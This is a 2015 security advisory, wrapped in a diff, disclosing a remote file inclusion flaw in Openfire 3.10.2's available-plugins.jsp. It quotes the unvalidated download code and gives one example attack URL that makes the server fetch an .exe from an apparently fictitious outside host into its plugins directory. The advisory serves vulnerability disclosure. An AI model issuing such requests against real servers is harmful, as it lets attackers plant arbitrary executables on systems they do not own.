@@ -1,0 +1,130 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-OPENFIRE-RFI.txt
+
+
+
+Vendor:
+================================
+www.igniterealtime.org/projects/openfire
+www.igniterealtime.org/downloads/index.jsp
+
+
+
+Product:
+================================
+Openfire 3.10.2
+
+Openfire is a real time collaboration (RTC) server licensed under the Open
+Source Apache License.
+It uses the only widely adopted open protocol for instant messaging, XMPP
+(also called Jabber).
+
+
+Vulnerability Type:
+=================================
+Remote File Inclusion
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+
+Vulnerability Details:
+=====================
+
+In "available-plugins.jsp" there is no validation for plugin downloads,
+allowing arbitrary file downloads
+from anywhere on the internet.
+
+On line 40: all that needs to be satisfied is the paramater is not null.
+
+boolean downloadRequested = request.getParameter("download") != null;
+String url = request.getParameter("url");
+
+
+If the above condition check returns true, the application downloads
+whatever file you give it.
+
+line 54:
+
+    if (downloadRequested) {
+        // Download and install new plugin
+        updateManager.downloadPlugin(url);
+        // Log the event
+        webManager.logEvent("downloaded new plugin from "+url, null);
+    }
+
+
+
+
+Exploit code(s):
+================
+
+1) download arbitrary filez
+
+e.g.
+
+http://localhost:9090/available-plugins.jsp?download=1&url=http://ghostofsin.abyss/abysmalgod.exe
+
+Our RFI will be downloaded to "openfire\plugins" directory.
+
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification:  NA
+Sept 14, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  GET
+
+
+Vulnerable Product:             [+]  Openfire 3.10.2
+
+
+Vulnerable Parameter(s):        [+]  download, url
+
+
+Affected Area(s):               [+]  Server
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
